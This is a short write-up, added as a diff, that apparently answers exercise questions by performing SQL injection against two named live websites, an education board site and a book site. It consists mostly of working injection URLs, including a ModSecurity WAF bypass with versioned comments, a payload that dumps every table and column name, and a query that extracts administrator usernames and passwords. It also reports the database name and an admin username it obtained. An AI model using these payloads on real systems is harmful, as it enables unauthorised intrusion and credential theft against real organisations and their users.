@@ -1,0 +1,19 @@
+To find the answer of question-1, which is asking to provide the name of the database of 'https://ssc.edu.in/newsdetails.php?id=26'
+We'll use Cyberfox browser and repeat the steps done for task-3.
+https://ssc.edu.in/newsdetails.php?id=26'
+https://ssc.edu.in/newsdetails.php?id=26'--+
+https://ssc.edu.in/newsdetails.php?id=26'+ORDER+BY+15--+
+But when we reach, https://ssc.edu.in/newsdetails.php?id=-26' Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+ we get an Mod-Security error aka WAF. So, to bypass it we wrap Union and Select by WAF BYPASS strings and it looks like this
+https://ssc.edu.in/newsdetails.php?id=-26' /*!13337Union+*//*!13337Select+*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+
+and we found our vulnerable column 2. To find the database's name we can simply 
+https://ssc.edu.in/newsdetails.php?id=-26%27%20/*!13337Union+Select*/%201,database(),3,4,5,6,7,8,9,10,11,12,13,14,15--+
+and the answer --> ssced1u4_ssc
+
+Now for question-2 and 3 we do the previous steps
+.
+.
+.
+https://www.pupilbooks.in/book/book.php?id=-12&subject_id=-1%20%20Union%20Select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+
+https://www.pupilbooks.in/book/book.php?id=-12&subject_id=-1%20%20Union%20Select%201,2,3,4,5,6,7,8,9,(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),%200x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x),11,12,13,14,15,16,17,18,19,20,21,22--+
+https://www.pupilbooks.in/book/book.php?id=-12&subject_id=-1%20%20Union%20Select%201,2,3,4,5,6,7,8,9,concat(v_username,0x3d,v_password,0x3d,v_usertype),11,12,13,14,15,16,17,18,19,20,21,22 from tbl_admin_users--+
+and we found answers. Ouestion-2 --> 4 and question-3 --> jitin.
